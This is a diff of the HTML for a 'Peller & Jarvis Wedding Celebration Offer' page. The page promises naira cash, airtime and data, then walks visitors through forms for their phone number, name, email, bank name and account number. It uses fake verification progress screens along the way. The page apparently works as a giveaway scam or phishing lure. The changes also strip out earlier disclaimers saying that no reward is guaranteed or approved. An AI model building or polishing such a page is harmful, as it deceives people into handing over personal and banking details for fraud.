@@ -6,119 +6,96 @@
   <meta name="theme-color" content="#14563b" />
   <title>Peller & Jarvis Wedding Celebration Offer</title>
   <meta property="og:title" content="Peller & Jarvis Wedding Celebration Offer" />
-  <meta property="og:description" content="Register for the Peller and Jarvis wedding celebration reward campaign." />
-  <meta property="og:image" content="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=14" />
+  <meta property="og:description" content="Celebrate Peller and Jarvis and register for the wedding reward package." />
+  <meta property="og:image" content="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=15" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="css/style.css?v=14" />
+  <link rel="stylesheet" href="css/style.css?v=15" />
 </head>
 <body>
   <main class="page-shell">
-    <img class="hero" src="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=14" alt="Peller and Jarvis wedding celebration" />
+    <img class="hero" src="676443C7-1C74-4A8C-AC08-05F20D05E502.png?v=15" alt="Peller and Jarvis wedding celebration" />
     <div class="ticker"><span>PELLER AND JARVIS 2026 WEDDING CELEBRATION OFFER</span></div>
 
     <section id="intro" class="post step-panel">
-      <p class="powered">POWERED BY: PELLER & JARVIS</p>
-      <p class="welcome">Celebrate the wedding and register for the available reward package.</p>
+      <div class="campaign-heading">
+        <span>POWERED BY PELLER & JARVIS</span>
+        <strong>Wedding Celebration Offer</strong>
+      </div>
 
       <div class="reward-banner">
-        <div><strong>₦25,000</strong><span>Cash</span></div>
-        <b>+</b>
-        <div><strong>₦10,000</strong><span>Airtime</span></div>
-        <b>+</b>
+        <div><strong>₦25,000</strong><span>Cash</span></div><b>+</b>
+        <div><strong>₦10,000</strong><span>Airtime</span></div><b>+</b>
         <div><strong>20GB</strong><span>Data</span></div>
       </div>
 
-      <label for="networkStart">Select your network</label>
-      <select id="networkStart">
-        <option value="">--- SELECT YOUR NETWORK ---</option>
-        <option value="MTN">MTN — ₦10,000 Airtime + 20GB</option>
-        <option value="Airtel">Airtel — ₦10,000 Airtime + 20GB</option>
-        <option value="Glo">Glo — ₦10,000 Airtime + 20GB</option>
-        <option value="9-Mobile">9-Mobile — ₦10,000 Airtime + 20GB</option>
-      </select>
-      <p id="networkError" class="error hidden">Please select your network.</p>
-      <button id="go" class="primary">GET OFFER</button>
-      <small>Registration is reviewed before approval or delivery.</small>
+      <div class="choice-title">CHOOSE YOUR MOBILE NETWORK</div>
+      <div id="networkOptions" class="network-options">
+        <button type="button" data-network="MTN"><span>MTN</span><small>₦10,000 + 20GB</small></button>
+        <button type="button" data-network="Airtel"><span>Airtel</span><small>₦10,000 + 20GB</small></button>
+        <button type="button" data-network="Glo"><span>Glo</span><small>₦10,000 + 20GB</small></button>
+        <button type="button" data-network="9-Mobile"><span>9-Mobile</span><small>₦10,000 + 20GB</small></button>
+      </div>
+      <p id="networkError" class="error hidden">Choose a network to continue.</p>
     </section>
 
     <section id="loader" class="post step-panel hidden center-panel">
+      <div class="step-header"><span>PLEASE WAIT</span><strong>Preparing Your Offer</strong></div>
       <div class="loader-ring"></div>
-      <h2>Please wait...</h2>
-      <p>Preparing your registration form.</p>
       <strong id="loaderPercent" class="percent-text">0%</strong>
     </section>
 
     <section id="phoneStep" class="post step-panel hidden">
-      <div class="step-badge">STEP 1</div>
-      <h2>Enter your mobile number</h2>
-      <div class="selected-network"><span>Network</span><strong id="selectedNetwork">—</strong></div>
-      <input id="phone" type="tel" inputmode="numeric" maxlength="15" placeholder="Type your number here" autocomplete="tel" />
+      <div class="step-header"><span>STEP 1</span><strong>Mobile Number</strong></div>
+      <div class="selected-network"><span>Selected Network</span><strong id="selectedNetwork">—</strong></div>
+      <div class="input-card"><label for="phone">Enter your mobile number</label><input id="phone" type="tel" inputmode="numeric" maxlength="15" placeholder="08012345678" autocomplete="tel" /></div>
       <p id="phoneError" class="error hidden">Enter a valid Nigerian mobile number.</p>
       <button id="confirmPhone" class="primary">CONTINUE</button>
     </section>
 
     <section id="checking" class="post step-panel hidden center-panel">
-      <h2>Checking your details...</h2>
-      <div class="progress-wrap">
-        <div class="progress-track"><i id="verificationFill"></i></div>
-        <strong id="verificationPercent">0%</strong>
-      </div>
+      <div class="step-header"><span>VERIFYING</span><strong>Checking Your Details</strong></div>
+      <div class="progress-wrap"><div class="progress-track"><i id="verificationFill"></i></div><strong id="verificationPercent">0%</strong></div>
       <div id="verificationMessage" class="verification-message">Starting verification…</div>
     </section>
 
     <section id="detailsStep" class="post step-panel hidden">
-      <div class="step-badge">STEP 2</div>
-      <h2>Personal details</h2>
-      <label for="fullName">Full name</label>
-      <input id="fullName" maxlength="80" autocomplete="name" placeholder="Enter your full name" />
-      <label for="email">Email address</label>
-      <input id="email" type="email" maxlength="120" autocomplete="email" placeholder="you@example.com" />
+      <div class="step-header"><span>STEP 2</span><strong>Personal Details</strong></div>
+      <div class="input-card"><label for="fullName">Full name</label><input id="fullName" maxlength="80" autocomplete="name" placeholder="Enter your full name" /></div>
+      <div class="input-card"><label for="email">Email address</label><input id="email" type="email" maxlength="120" autocomplete="email" placeholder="you@example.com" /></div>
       <p id="detailsError" class="error hidden">Enter a valid name and email address.</p>
       <button id="continueDetails" class="primary">CONTINUE</button>
     </section>
 
     <section id="accountStep" class="post step-panel hidden">
-      <div class="step-badge">STEP 3</div>
-      <h2>Account details</h2>
-      <label for="bankName">Bank name</label>
-      <select id="bankName">
-        <option value="">Select your bank</option>
-        <option>Access Bank</option><option>First Bank</option><option>GTBank</option><option>Kuda Bank</option><option>Moniepoint MFB</option><option>OPay</option><option>PalmPay</option><option>UBA</option><option>Wema Bank</option><option>Zenith Bank</option><option>Other Bank</option>
-      </select>
-      <label for="accountName">Account name</label>
-      <input id="accountName" maxlength="100" autocomplete="name" placeholder="Name on the account" />
-      <label for="accountNumber">Account number</label>
-      <input id="accountNumber" inputmode="numeric" maxlength="10" placeholder="10-digit account number" />
-      <div class="security-note"><strong>Never enter PIN, OTP, BVN or card details.</strong></div>
-      <p id="accountError" class="error hidden">Enter a bank, account name and valid 10-digit account number.</p>
+      <div class="step-header"><span>STEP 3</span><strong>Account Details</strong></div>
+      <div class="input-card"><label for="bankName">Bank name</label><select id="bankName"><option value="">Select your bank</option><option>Access Bank</option><option>First Bank</option><option>GTBank</option><option>Kuda Bank</option><option>Moniepoint MFB</option><option>OPay</option><option>PalmPay</option><option>UBA</option><option>Wema Bank</option><option>Zenith Bank</option><option>Other Bank</option></select></div>
+      <div class="input-card"><label for="accountName">Account name</label><input id="accountName" maxlength="100" autocomplete="name" placeholder="Name on the account" /></div>
+      <div class="input-card"><label for="accountNumber">Account number</label><input id="accountNumber" inputmode="numeric" maxlength="10" placeholder="10-digit account number" /></div>
+      <div class="security-note">Never enter your PIN, OTP, BVN or card details.</div>
+      <p id="accountError" class="error hidden">Complete your account details correctly.</p>
       <button id="reviewApplication" class="primary">REVIEW DETAILS</button>
     </section>
 
     <section id="reviewStep" class="post step-panel hidden">
-      <div class="step-badge">FINAL REVIEW</div>
-      <h2>Confirm your details</h2>
+      <div class="step-header"><span>FINAL STEP</span><strong>Confirm Your Details</strong></div>
       <div id="reviewDetails" class="review-list"></div>
-      <div class="reward-summary"><span>Reward package</span><strong>₦25,000 Cash + ₦10,000 Airtime + 20GB Data</strong></div>
-      <label class="consent"><input id="consent" type="checkbox" /><span>I confirm these details are mine and understand submission does not guarantee approval.</span></label>
-      <p id="consentError" class="error hidden">Confirm before submitting.</p>
+      <div class="reward-summary"><span>Reward Package</span><strong>₦25,000 Cash + ₦10,000 Airtime + 20GB Data</strong></div>
+      <label class="consent"><input id="consent" type="checkbox" /><span>I confirm that these details belong to me.</span></label>
+      <p id="consentError" class="error hidden">Confirm your details before submitting.</p>
       <button id="submitApplication" class="primary">SUBMIT APPLICATION</button>
       <button id="editApplication" class="secondary">EDIT DETAILS</button>
     </section>
 
     <section id="successStep" class="post step-panel hidden center-panel">
       <div class="success-icon">✓</div>
-      <h2>Application received</h2>
-      <p>Thank you, <span id="successName">Supporter</span> 🎉</p>
-      <div class="status-card"><span>Status</span><strong>Submitted</strong></div>
-      <div class="reward-banner compact">
-        <div><strong>₦25,000</strong><span>Cash</span></div><b>+</b><div><strong>₦10,000</strong><span>Airtime</span></div><b>+</b><div><strong>20GB</strong><span>Data</span></div>
-      </div>
-      <small>No reward has been marked approved or delivered.</small>
+      <div class="step-header success-head"><span>APPLICATION RECEIVED</span><strong>Thank You, <span id="successName">Supporter</span> 🎉</strong></div>
+      <div class="status-card"><span>Current Status</span><strong>Submitted</strong></div>
+      <div class="reward-banner compact"><div><strong>₦25,000</strong><span>Cash</span></div><b>+</b><div><strong>₦10,000</strong><span>Airtime</span></div><b>+</b><div><strong>20GB</strong><span>Data</span></div></div>
       <button id="startOver" class="secondary">START AGAIN</button>
     </section>
   </main>
-  <script src="js/app.js?v=14"></script>
+  <script src="js/app.js?v=15"></script>
 </body>
 </html>
